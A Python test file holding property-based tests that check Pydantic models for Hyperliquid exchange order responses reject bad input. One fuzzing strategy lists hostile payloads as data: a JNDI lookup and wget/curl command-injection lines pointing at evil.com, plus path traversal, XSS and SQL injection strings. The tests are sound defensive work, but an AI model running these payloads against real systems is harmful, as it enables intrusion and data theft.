"""Property-based tests for Hyperliquid raw exchange response models.

These tests validate critical security boundary models that process external exchange response data.
The models tested here are essential for order status tracking, execution, and error handling.

SECURITY CRITICAL: These raw models protect against:
- Malicious response data that could manipulate order status information
- Financial precision errors in fill prices and sizes
- Order ID manipulation that could affect execution tracking
- Status manipulation that could change order lifecycle behavior
- Buffer overflow attacks through oversized response data
- Injection attacks through malformed error messages
- Response tampering that could affect trading decisions

Property testing ensures comprehensive coverage of response edge cases and adversarial inputs.
"""

import json
from decimal import Decimal
from typing import Any, cast

import pytest
from hypothesis import assume, given, strategies as st
from hypothesis.strategies import DrawFn, SearchStrategy
from pydantic import ValidationError

from cyberdelta.apis.exceptions.field_validation import TypeFieldError
from cyberdelta.apis.hyperliquid.models.hl_raw_exchange_response import (
    HyperliquidRawExchangeResponse,
    HyperliquidRawExchangeResponseData,
    HyperliquidRawExchangeStatusFilled,
    HyperliquidRawExchangeStatusObject,
    HyperliquidRawExchangeStatusResting,
)
from cyberdelta.exceptions.parsing import EmptyStringError


# Type alias for malicious input types to avoid long lines
MaliciousInput = str | int | float | bool | list[str] | dict[str, str] | bytes | None


# =============================================================================
# HYPOTHESIS STRATEGIES FOR EXCHANGE RESPONSE MODEL TESTING
# =============================================================================


def decimal_str_strategy() -> SearchStrategy[str]:
    """Generate valid decimal strings for prices and amounts.

    Returns:
        SearchStrategy[str]: Strategy for generating test data.
    """
    return st.one_of([
        st.decimals(min_value=Decimal("0.00000001"), max_value=Decimal(1000000), places=8).map(str),
        st.decimals(min_value=Decimal("0.01"), max_value=Decimal(100000), places=6).map(str),
        st.just("0"),  # Zero
        st.just("0.01"),  # Small amount
        st.just("1.0"),  # Unit amount
        st.just("100.0"),  # Standard amount
        st.just("1234.56"),  # Common format
        st.just("50000.123456"),  # High-precision
        st.just("0.00000001"),  # Minimum precision
        # Scientific notation (valid for decimal parsing)
        st.just("1e2"),
        st.just("1.5e3"),
        st.just("2.5e-4"),
    ])


def positive_decimal_str_strategy() -> SearchStrategy[str]:
    """Generate valid positive decimal strings.

    Returns:
        SearchStrategy[str]: Strategy for generating test data.
    """
    return st.one_of([
        st.decimals(min_value=Decimal("0.00000001"), max_value=Decimal(1000000), places=8).map(str),
        st.decimals(min_value=Decimal("0.01"), max_value=Decimal(100000), places=6).map(str),
        st.just("0.01"),
        st.just("1.0"),
        st.just("100.0"),
        st.just("1234.56"),
        st.just("50000.123456"),
    ])


def order_id_strategy() -> SearchStrategy[int]:
    """Generate valid order IDs.

    Returns:
        SearchStrategy[int]: Strategy for generating test data.
    """
    return st.integers(min_value=0, max_value=2**63 - 1)


def status_string_strategy() -> SearchStrategy[str]:
    """Generate valid status strings.

    Returns:
        SearchStrategy[str]: Strategy for generating test data.
    """
    return st.sampled_from([
        "canceled",
        "modified",
        "success",
        "rejected",
        "failed",
        "pending",
        "acknowledged",
        "working",
        "filled",
        "partial",
    ])


def error_message_strategy() -> SearchStrategy[str]:
    """Generate valid error message strings.

    Returns:
        SearchStrategy[str]: Strategy for generating test data.
    """
    return st.one_of([
        st.sampled_from([
            "Order rejected due to insufficient margin",
            "Invalid order parameters",
            "Market closed",
            "Rate limit exceeded",
            "Unauthorized request",
            "Order not found",
            "Execution failed",
            "Network timeout",
            "System error",
        ]),
        st.text(
            min_size=1,
            max_size=256,
            alphabet=st.characters(
                blacklist_categories=["Cs"],  # Exclude surrogates
                min_codepoint=1,  # Exclude null character
            ),
        ).filter(lambda x: x.strip()),
    ])


@st.composite
def valid_resting_data(draw: DrawFn) -> dict[str, int]:
    """Generate valid resting status data.

    Returns:
        dict[str, int]: Generated test data.
    """
    return {"oid": draw(order_id_strategy())}


@st.composite
def valid_filled_data(draw: DrawFn) -> dict[str, Any]:
    """Generate valid filled status data.

    Returns:
        dict[str, Any]: Generated test data.
    """
    return {
        "oid": draw(order_id_strategy()),
        "totalSz": draw(positive_decimal_str_strategy()),
        "avgPx": draw(decimal_str_strategy()),
    }


@st.composite
def valid_status_object_data(draw: DrawFn) -> dict[str, Any]:
    """Generate valid status object data.

    Returns:
        dict[str, Any]: Generated test data.
    """

    def _build_resting_status(resting: dict[str, int]) -> dict[str, dict[str, int]]:
        """Build resting status object.

        Returns:
            dict[str, dict[str, int]]: Resting status wrapped in status object.
        """
        return {"resting": resting}

    def _build_filled_status(filled: dict[str, Any]) -> dict[str, dict[str, Any]]:
        """Build filled status object.

        Returns:
            dict[str, dict[str, Any]]: Filled status wrapped in status object.
        """
        return {"filled": filled}

    def _build_error_status(error: str) -> dict[str, str]:
        """Build error status object.

        Returns:
            dict[str, str]: Error status wrapped in status object.
        """
        return {"error": error}

    return draw(
        st.one_of([
            st.builds(_build_resting_status, resting=valid_resting_data()),
            st.builds(_build_filled_status, filled=valid_filled_data()),
            st.builds(_build_error_status, error=error_message_strategy()),
        ])
    )


def status_entry_strategy() -> SearchStrategy[str | dict[str, Any]]:
    """Generate valid status entries (strings or objects).

    Returns:
        SearchStrategy[str | dict[str, Any]]: Strategy for generating test data.
    """
    return st.one_of([
        status_string_strategy(),
        valid_status_object_data(),
    ])


@st.composite
def valid_response_data(draw: DrawFn) -> dict[str, Any]:
    """Generate valid response data.

    Returns:
        dict[str, Any]: Generated test data.
    """
    return {
        "type": draw(st.text(min_size=1, max_size=64).filter(lambda x: x.strip())),
        "statuses": draw(st.lists(status_entry_strategy(), min_size=0, max_size=20)),
    }


@st.composite
def valid_exchange_response_data(draw: DrawFn) -> dict[str, Any]:
    """Generate valid exchange response data.

    Returns:
        dict[str, Any]: Generated test data.
    """
    return {
        "status": "ok",  # Must be "ok" according to model
        "data": draw(
            st.one_of([
                st.none(),  # Data can be None
                valid_response_data(),
            ])
        ),
    }


def malicious_exchange_strategy() -> SearchStrategy[MaliciousInput]:
    """Generate malicious values for exchange response security testing.

    Returns:
        SearchStrategy[str]: Strategy for generating test data.
    """
    return st.one_of([
        # Exchange response manipulation attempts
        st.just("${jndi:ldap://evil.com/steal-responses}"),
        st.just("../../etc/passwd"),  # Path traversal
        # XSS attempts
        st.just("<script>alert('exchange-xss')</script>"),
        st.just("<img src=x onerror=alert(document.cookie)>"),
        # SQL injection attempts
        st.just("'; DROP TABLE orders;--"),
        st.just("1' UNION SELECT * FROM trades--"),
        # Buffer overflow attempts
        st.text(min_size=1000, max_size=1500),
        st.just("E" * 10000),
        # Unicode attacks
        st.just("\udce2\udc28\udc00"),  # Lone surrogates
        st.just("\x00\x01\x02"),  # Control characters
        # Format string attacks
        st.just("%s%s%s%s%n"),
        st.just("%x%x%x%x"),
        # Command injection
        st.just("; wget evil.com/backdoor"),
        st.just("`curl evil.com/exfiltrate`"),
        # NoSQL injection
        st.just("'; return db.orders.find(); //"),
        # JSON injection
        st.just('{"$where": "this.status == \'filled\'"}'),
        # Invalid decimals
        st.just("NaN"),
        st.just("inf"),
        st.just("-inf"),
        st.just("Infinity"),
        st.just("not_a_number"),
        # Type confusion
        st.none(),
        st.integers(),
        st.floats(),
        st.booleans(),
        st.lists(st.text()),
        st.dictionaries(st.text(), st.text()),
        st.binary(),
    ])


# =============================================================================
# PROPERTY TESTS FOR HYPERLIQUID RAW EXCHANGE STATUS RESTING MODEL
# =============================================================================


class TestHyperliquidRawExchangeStatusRestingProperties:
    """Property-based tests for exchange status resting validation and security."""

    @given(resting_data=valid_resting_data())
    def test_resting_validation_success_properties(self, resting_data: dict[str, int]) -> None:
        """Property: Valid data should create valid resting objects."""
        # Skip invalid data
        oid = resting_data["oid"]
        assume(oid >= 0)

        obj = HyperliquidRawExchangeStatusResting.model_validate(resting_data)

        # Property: Object should be created successfully
        assert isinstance(obj, HyperliquidRawExchangeStatusResting)
        assert obj.oid == resting_data["oid"]

        # Property: Model should be configured correctly
        assert obj.model_config.get("extra") == "forbid"
        assert obj.model_config.get("frozen") is True

    @given(malicious_value=malicious_exchange_strategy())
    def test_resting_security_boundary_properties(self, malicious_value: MaliciousInput) -> None:
        """Property: Resting status should reject malicious inputs."""
        resting_data = {"oid": malicious_value}

        # Property: Malicious input should be rejected
        with pytest.raises((ValidationError, TypeError, TypeFieldError)):
            HyperliquidRawExchangeStatusResting.model_validate(resting_data)

    @given(invalid_oid=st.integers(min_value=-1000, max_value=-1))
    def test_resting_negative_oid_properties(self, invalid_oid: int) -> None:
        """Property: Resting status should reject negative order IDs."""
        resting_data = {"oid": invalid_oid}

        # Property: Negative OIDs should be rejected
        with pytest.raises(ValidationError):
            HyperliquidRawExchangeStatusResting.model_validate(resting_data)

    @given(
        extra_fields=st.dictionaries(
            st.text(min_size=1, max_size=20),
            st.text(min_size=1, max_size=20),
            min_size=1,
            max_size=5,
        )
    )
    def test_resting_extra_fields_properties(self, extra_fields: dict[str, str]) -> None:
        """Property: Resting status should forbid extra fields."""
        resting_data: dict[str, Any] = {"oid": 12345}
        resting_data.update(extra_fields)

        # Property: Extra fields should be rejected
        with pytest.raises(ValidationError):
            HyperliquidRawExchangeStatusResting.model_validate(resting_data)


# =============================================================================
# PROPERTY TESTS FOR HYPERLIQUID RAW EXCHANGE STATUS FILLED MODEL
# =============================================================================


class TestHyperliquidRawExchangeStatusFilledProperties:
    """Property-based tests for exchange status filled validation and security."""

    @given(filled_data=valid_filled_data())
    def test_filled_validation_success_properties(self, filled_data: dict[str, Any]) -> None:
        """Property: Valid data should create valid filled objects."""
        # Skip invalid data
        oid = filled_data["oid"]
        assume(oid >= 0)

        # Validate decimal fields
        for field in ["totalSz", "avgPx"]:
            value = filled_data[field]
            assume(isinstance(value, str) and value.strip())
            try:
                decimal_val = Decimal(value.strip())
                assume(decimal_val.is_finite())
                if field == "totalSz":
                    assume(decimal_val >= 0)
            except (ValueError, TypeError):
                assume(False)

        obj = HyperliquidRawExchangeStatusFilled.model_validate(filled_data)

        # Property: Object should be created successfully
        assert isinstance(obj, HyperliquidRawExchangeStatusFilled)
        assert obj.oid == filled_data["oid"]
        assert Decimal(obj.total_sz) == Decimal(filled_data["totalSz"])
        assert Decimal(obj.avg_px) == Decimal(filled_data["avgPx"])

        # Property: Model should be configured correctly
        assert obj.model_config.get("extra") == "forbid"
        assert obj.model_config.get("frozen") is True

    @given(
        field_name=st.sampled_from(["oid", "totalSz", "avgPx"]),
        malicious_value=malicious_exchange_strategy(),
    )
    def test_filled_security_boundary_properties(
        self, field_name: str, malicious_value: MaliciousInput
    ) -> None:
        """Property: Filled status should reject malicious inputs."""
        base_data: dict[str, object] = {
            "oid": 12345,
            "totalSz": "1.0",
            "avgPx": "100.0",
        }
        base_data[field_name] = malicious_value

        # Property: Malicious input should be rejected
        with pytest.raises((ValidationError, TypeError, EmptyStringError, TypeFieldError)):
            HyperliquidRawExchangeStatusFilled.model_validate(base_data)

    @given(
        invalid_decimal=st.one_of([
            st.just(""),
            st.just("   "),
            st.just("NaN"),
            st.just("inf"),
            st.just("-inf"),
            st.just("Infinity"),
            st.just("not_a_number"),
            st.just("1..0"),
        ])
    )
    def test_filled_invalid_decimal_properties(self, invalid_decimal: str) -> None:
        """Property: Filled status should validate decimal constraints."""
        filled_data = {
            "oid": 12345,
            "totalSz": invalid_decimal,  # Invalid decimal
            "avgPx": "100.0",
        }

        try:
            # Check if the value can be parsed as a finite decimal
            decimal_val = Decimal(invalid_decimal.strip() if invalid_decimal else "")
            is_finite = decimal_val.is_finite()
            is_empty = not invalid_decimal.strip()

            if is_finite and not is_empty:
                # Property: Valid finite decimals should be accepted
                obj = HyperliquidRawExchangeStatusFilled.model_validate(filled_data)
                assert Decimal(obj.total_sz) == decimal_val
            else:
                # Property: Non-finite or empty values should be rejected
                with pytest.raises((ValidationError, EmptyStringError, TypeFieldError)):
                    HyperliquidRawExchangeStatusFilled.model_validate(filled_data)

        except (ValueError, TypeError):
            # Property: Unparseable strings should be rejected
            with pytest.raises((ValidationError, EmptyStringError, TypeFieldError)):
                HyperliquidRawExchangeStatusFilled.model_validate(filled_data)


# =============================================================================
# PROPERTY TESTS FOR HYPERLIQUID RAW EXCHANGE STATUS OBJECT MODEL
# =============================================================================


class TestHyperliquidRawExchangeStatusObjectProperties:
    """Property-based tests for exchange status object validation and security."""

    @given(status_data=valid_status_object_data())
    def test_status_object_validation_success_properties(self, status_data: dict[str, Any]) -> None:
        """Property: Valid data should create valid status objects."""
        # Validate the structure based on which field is present
        if "resting" in status_data:
            resting = status_data["resting"]
            resting_oid = resting["oid"]
            assume(isinstance(resting_oid, int) and resting_oid >= 0)
        elif "filled" in status_data:
            filled = status_data["filled"]
            filled_oid = filled["oid"]
            assume(isinstance(filled_oid, int) and filled_oid >= 0)
            # Validate decimal fields
            for field in ["totalSz", "avgPx"]:
                value = filled[field]
                assume(isinstance(value, str) and value.strip())
                try:
                    decimal_val = Decimal(value.strip())
                    assume(decimal_val.is_finite())
                    if field == "totalSz":
                        assume(decimal_val >= 0)
                except (ValueError, TypeError):
                    assume(False)
        elif "error" in status_data:
            error_msg = status_data["error"]
            assume(isinstance(error_msg, str) and error_msg.strip())

        obj = HyperliquidRawExchangeStatusObject.model_validate(status_data)

        # Property: Object should be created successfully
        assert isinstance(obj, HyperliquidRawExchangeStatusObject)

        # Property: Only one field should be set
        fields_set = sum([
            obj.resting is not None,
            obj.filled is not None,
            obj.error is not None,
        ])
        assert fields_set == 1

        # Property: Model should be configured correctly
        assert obj.model_config.get("extra") == "forbid"
        assert obj.model_config.get("frozen") is True

    @given(
        field_name=st.sampled_from(["resting", "filled", "error"]),
        malicious_value=malicious_exchange_strategy(),
    )
    def test_status_object_security_boundary_properties(
        self, field_name: str, malicious_value: MaliciousInput
    ) -> None:
        """Property: Status object should reject malicious inputs."""
        status_data = {field_name: malicious_value}

        # Property: Malicious input should be rejected
        with pytest.raises((ValidationError, TypeError, EmptyStringError, TypeFieldError)):
            HyperliquidRawExchangeStatusObject.model_validate(status_data)

    @given(
        extra_fields=st.dictionaries(
            st.text(min_size=1, max_size=20),
            st.text(min_size=1, max_size=20),
            min_size=1,
            max_size=5,
        )
    )
    def test_status_object_extra_fields_properties(self, extra_fields: dict[str, str]) -> None:
        """Property: Status object should forbid extra fields."""
        status_data = {"error": "Some error"}
        status_data.update(extra_fields)

        # Property: Extra fields should be rejected
        with pytest.raises(ValidationError):
            HyperliquidRawExchangeStatusObject.model_validate(status_data)


# =============================================================================
# PROPERTY TESTS FOR HYPERLIQUID RAW EXCHANGE RESPONSE DATA MODEL
# =============================================================================


class TestHyperliquidRawExchangeResponseDataProperties:
    """Property-based tests for exchange response data validation and security."""

    @given(response_data=valid_response_data())
    def test_response_data_validation_success_properties(
        self, response_data: dict[str, Any]
    ) -> None:
        """Property: Valid data should create valid response data objects."""
        # Skip invalid data
        type_str = response_data["type"]
        assume(isinstance(type_str, str) and type_str.strip())

        # Validate statuses list
        statuses = response_data["statuses"]
        assume(isinstance(statuses, list))

        valid_statuses: list[str | dict[str, Any]] = []
        for status in statuses:
            if isinstance(status, str):
                assume(
                    status
                    in [
                        "canceled",
                        "modified",
                        "success",
                        "rejected",
                        "failed",
                        "pending",
                        "acknowledged",
                        "working",
                        "filled",
                        "partial",
                    ]
                )
                valid_statuses.append(status)
            elif isinstance(status, dict):
                # Validate status object structure
                status_dict = cast(dict[str, Any], status)
                if "resting" in status_dict:
                    resting = status_dict["resting"]
                    resting_oid = resting["oid"]
                    assume(isinstance(resting_oid, int) and resting_oid >= 0)
                elif "filled" in status_dict:
                    filled = status_dict["filled"]
                    filled_oid = filled["oid"]
                    assume(isinstance(filled_oid, int) and filled_oid >= 0)
                    for field in ["totalSz", "avgPx"]:
                        value = filled[field]
                        assume(isinstance(value, str) and value.strip())
                        try:
                            decimal_val = Decimal(value.strip())
                            assume(decimal_val.is_finite())
                        except (ValueError, TypeError):
                            assume(False)
                elif "error" in status_dict:
                    error_msg = status_dict["error"]
                    assume(isinstance(error_msg, str) and error_msg.strip())
                valid_statuses.append(status_dict)

        # Update with valid statuses only
        response_data["statuses"] = valid_statuses

        obj = HyperliquidRawExchangeResponseData.model_validate(response_data)

        # Property: Object should be created successfully
        assert isinstance(obj, HyperliquidRawExchangeResponseData)
        assert obj.type == response_data["type"]
        assert len(obj.statuses) == len(response_data["statuses"])

        # Property: Model should be configured correctly
        assert obj.model_config.get("extra") == "forbid"
        assert obj.model_config.get("frozen") is True

    @given(
        field_name=st.sampled_from(["type", "statuses"]),
        malicious_value=malicious_exchange_strategy(),
    )
    def test_response_data_security_boundary_properties(
        self, field_name: str, malicious_value: MaliciousInput
    ) -> None:
        """Property: Response data should reject malicious inputs."""
        base_data: dict[str, object] = {
            "type": "order",
            "statuses": ["success"],
        }
        base_data[field_name] = malicious_value

        # Property: Malicious input should be rejected
        with pytest.raises((ValidationError, TypeError, EmptyStringError, TypeFieldError)):
            HyperliquidRawExchangeResponseData.model_validate(base_data)

    @given(
        invalid_statuses=st.one_of([
            st.integers(),  # Not a list
            st.text(),  # Not a list
            st.lists(st.integers()),  # List of wrong types
            st.lists(
                st.text().filter(
                    lambda x: x
                    not in [
                        "canceled",
                        "modified",
                        "success",
                        "rejected",
                        "failed",
                        "pending",
                        "acknowledged",
                        "working",
                        "filled",
                        "partial",
                    ]
                )
            ),  # List of invalid strings
        ])
    )
    def test_response_data_invalid_statuses_properties(
        self, invalid_statuses: MaliciousInput
    ) -> None:
        """Property: Response data should validate statuses list structure."""
        response_data = {
            "type": "order",
            "statuses": invalid_statuses,
        }

        # Property: Invalid statuses should be rejected
        with pytest.raises((ValidationError, TypeError)):
            HyperliquidRawExchangeResponseData.model_validate(response_data)


# =============================================================================
# PROPERTY TESTS FOR HYPERLIQUID RAW EXCHANGE RESPONSE MODEL
# =============================================================================


class TestHyperliquidRawExchangeResponseProperties:
    """Property-based tests for exchange response validation and security."""

    def _validate_status_string(self, status_item: str) -> None:
        """Validate string status values."""
        assume(
            status_item
            in [
                "canceled",
                "modified",
                "success",
                "rejected",
                "failed",
                "pending",
                "acknowledged",
                "working",
                "filled",
                "partial",
            ]
        )

    def _validate_status_object(self, status_item: dict[str, Any]) -> None:
        """Validate status object structure."""
        if "resting" in status_item:
            resting = status_item["resting"]
            resting_oid = resting["oid"]
            assume(isinstance(resting_oid, int) and resting_oid >= 0)
        elif "filled" in status_item:
            filled = status_item["filled"]
            filled_oid = filled["oid"]
            assume(isinstance(filled_oid, int) and filled_oid >= 0)
            for field in ["totalSz", "avgPx"]:
                value = filled[field]
                assume(isinstance(value, str) and value.strip())
                try:
                    decimal_val = Decimal(value.strip())
                    assume(decimal_val.is_finite())
                except (ValueError, TypeError):
                    assume(False)
        elif "error" in status_item:
            error_msg = status_item["error"]
            assume(isinstance(error_msg, str) and error_msg.strip())

    def _validate_exchange_data_structure(self, exchange_data: dict[str, Any]) -> None:
        """Validate the basic structure of exchange data."""
        data = exchange_data["data"]
        if data is not None:
            assume(isinstance(data, dict))
            type_str = data["type"]
            assume(isinstance(type_str, str) and type_str.strip())

            statuses = data["statuses"]
            assume(isinstance(statuses, list))

            valid_statuses: list[str | dict[str, Any]] = []
            for status_item in statuses:
                if isinstance(status_item, str):
                    self._validate_status_string(status_item)
                    valid_statuses.append(status_item)
                elif isinstance(status_item, dict):
                    status_dict = cast(dict[str, Any], status_item)
                    self._validate_status_object(status_dict)
                    valid_statuses.append(status_dict)

            data["statuses"] = valid_statuses

    @given(exchange_data=valid_exchange_response_data())
    def test_exchange_response_validation_success_properties(
        self, exchange_data: dict[str, Any]
    ) -> None:
        """Property: Valid data should create valid response objects."""
        status = exchange_data["status"]
        assume(status == "ok")

        self._validate_exchange_data_structure(exchange_data)

        obj = HyperliquidRawExchangeResponse.model_validate(exchange_data)

        assert isinstance(obj, HyperliquidRawExchangeResponse)
        assert obj.status == "ok"

        if exchange_data["data"] is not None:
            assert obj.data is not None
            assert obj.data.type == exchange_data["data"]["type"]
        else:
            assert obj.data is None

        assert obj.model_config.get("extra") == "forbid"
        assert obj.model_config.get("frozen") is True

    @given(
        field_name=st.sampled_from(["status", "data"]),
        malicious_value=malicious_exchange_strategy(),
    )
    def test_exchange_response_security_boundary_properties(
        self, field_name: str, malicious_value: MaliciousInput
    ) -> None:
        """Property: Exchange response should reject malicious inputs."""
        base_data: dict[str, object] = {
            "status": "ok",
            "data": None,
        }
        base_data[field_name] = malicious_value

        # Property: Malicious input should be rejected
        with pytest.raises((ValidationError, TypeError, EmptyStringError, TypeFieldError)):
            HyperliquidRawExchangeResponse.model_validate(base_data)

    @given(invalid_status=st.text().filter(lambda x: x != "ok"))
    def test_exchange_response_invalid_status_properties(self, invalid_status: str) -> None:
        """Property: Exchange response should only accept 'ok' as status."""
        assume(invalid_status.strip())  # Skip empty strings

        exchange_data = {
            "status": invalid_status,
            "data": None,
        }

        # Property: Invalid status values should be rejected
        with pytest.raises((ValidationError, EmptyStringError)):
            HyperliquidRawExchangeResponse.model_validate(exchange_data)

    @given(exchange_data=valid_exchange_response_data())
    def test_exchange_response_json_serialization_properties(
        self, exchange_data: dict[str, Any]
    ) -> None:
        """Property: Exchange response should maintain JSON serialization compatibility."""
        status = exchange_data["status"]
        assume(status == "ok")

        self._validate_exchange_data_structure(exchange_data)

        obj = HyperliquidRawExchangeResponse.model_validate(exchange_data)
        json_str = obj.model_dump_json()
        parsed_json = json.loads(json_str)

        reconstructed = HyperliquidRawExchangeResponse.model_validate(parsed_json)
        assert reconstructed.status == obj.status

        if obj.data is not None:
            assert reconstructed.data is not None
            assert reconstructed.data.type == obj.data.type
        else:
            assert reconstructed.data is None


# =============================================================================
# LEGACY COMPATIBILITY TESTS
# =============================================================================


def test_HyperliquidRawExchangeStatusResting_valid() -> None:
    """Test hl resting valid."""
    valid_resting_data = {"oid": 12345}
    obj = HyperliquidRawExchangeStatusResting.model_validate(valid_resting_data)
    assert obj.oid == 12345
    assert obj.model_config.get("extra") == "forbid"
    assert obj.model_config.get("frozen") is True


def test_HyperliquidRawExchangeStatusFilled_valid() -> None:
    """Test hl filled valid."""
    valid_filled_data = {"oid": 67890, "totalSz": "1.5", "avgPx": "150.25"}
    obj = HyperliquidRawExchangeStatusFilled.model_validate(valid_filled_data)
    assert obj.oid == 67890
    assert obj.total_sz == "1.5"
    assert obj.avg_px == "150.25"
    assert obj.model_config.get("extra") == "forbid"
    assert obj.model_config.get("frozen") is True


def test_HyperliquidRawExchangeStatusObject_valid() -> None:
    """Test hl status object valid."""
    valid_status_object_resting = {"resting": {"oid": 12345}}
    resting = HyperliquidRawExchangeStatusObject.model_validate(valid_status_object_resting)
    assert resting.resting is not None
    assert resting.resting.oid == 12345
    assert resting.filled is None
    assert resting.error is None
    assert resting.model_config.get("extra") == "forbid"
    assert resting.model_config.get("frozen") is True

    valid_status_object_filled = {"filled": {"oid": 67890, "totalSz": "1.5", "avgPx": "150.25"}}
    filled = HyperliquidRawExchangeStatusObject.model_validate(valid_status_object_filled)
    assert filled.resting is None
    assert filled.filled is not None
    assert filled.filled.oid == 67890
    assert filled.error is None
    assert filled.model_config.get("extra") == "forbid"
    assert filled.model_config.get("frozen") is True

    valid_status_object_error = {"error": "Order rejected due to insufficient margin."}
    error = HyperliquidRawExchangeStatusObject.model_validate(valid_status_object_error)
    assert error.resting is None
    assert error.filled is None
    assert error.error == "Order rejected due to insufficient margin."
    assert error.model_config.get("extra") == "forbid"
    assert error.model_config.get("frozen") is True


def test_HyperliquidRawExchangeResponseData_valid() -> None:
    """Test hl response data valid."""
    valid_response_data_dict = {
        "type": "order",
        "statuses": [
            "canceled",
            {"resting": {"oid": 12345}},
            {"filled": {"oid": 67890, "totalSz": "1.5", "avgPx": "150.25"}},
            "modified",
            "success",
        ],
    }
    obj = HyperliquidRawExchangeResponseData.model_validate(valid_response_data_dict)
    assert obj.type == "order"
    assert len(obj.statuses) == 5
    assert obj.statuses[0] == "canceled"
    assert isinstance(obj.statuses[1], HyperliquidRawExchangeStatusObject)
    assert obj.statuses[1].resting is not None
    assert obj.statuses[1].resting.oid == 12345
    assert isinstance(obj.statuses[2], HyperliquidRawExchangeStatusObject)
    assert obj.statuses[2].filled is not None
    assert obj.statuses[2].filled.oid == 67890
    assert obj.statuses[3] == "modified"
    assert obj.statuses[4] == "success"
    assert obj.model_config.get("extra") == "forbid"
    assert obj.model_config.get("frozen") is True


def test_HyperliquidRawExchangeResponse_valid() -> None:
    """Test hl response valid."""
    valid_top_level_response = {
        "status": "ok",
        "data": {
            "type": "order",
            "statuses": [
                "canceled",
                {"resting": {"oid": 12345}},
                {"filled": {"oid": 67890, "totalSz": "1.5", "avgPx": "150.25"}},
                "modified",
                "success",
            ],
        },
    }
    obj = HyperliquidRawExchangeResponse.model_validate(valid_top_level_response)
    assert obj.status == "ok"
    assert obj.data is not None
    assert obj.data.type == "order"
    assert len(obj.data.statuses) == 5
    assert obj.model_config.get("extra") == "forbid"
    assert obj.model_config.get("frozen") is True


def test_HyperliquidRawExchangeResponse_valid_no_data() -> None:
    """Test valid response when data is explicitly None."""
    response_dict = {"status": "ok", "data": None}
    obj = HyperliquidRawExchangeResponse.model_validate(response_dict)
    assert obj.status == "ok"
    assert obj.data is None


def test_HyperliquidRawExchangeResponse_valid_missing_data() -> None:
    """Test valid response when data key is missing."""
    response_dict = {"status": "ok"}
    obj = HyperliquidRawExchangeResponse.model_validate(response_dict)
    assert obj.status == "ok"
    assert obj.data is None


def test_HyperliquidRawExchangeStatusResting_invalid_oid() -> None:
    """Test hl resting invalid oid."""
    with pytest.raises(ValidationError):
        HyperliquidRawExchangeStatusResting.model_validate({"oid": -1})


def test_HyperliquidRawExchangeStatusFilled_invalid_decimal() -> None:
    """Test hl filled invalid decimal."""
    with pytest.raises((ValidationError, EmptyStringError)):
        HyperliquidRawExchangeStatusFilled.model_validate({"oid": 1, "totalSz": "", "avgPx": "1.0"})


def test_HyperliquidRawExchangeResponse_invalid_status() -> None:
    """Test hl response invalid status."""
    with pytest.raises(ValidationError):
        HyperliquidRawExchangeResponse.model_validate({"status": "error", "data": None})


def test_HyperliquidRawExchangeStatusObject_extra_fields() -> None:
    """Test that extra fields are rejected."""
    with pytest.raises(ValidationError):
        HyperliquidRawExchangeStatusObject.model_validate({"error": "Some error", "extra": 1})
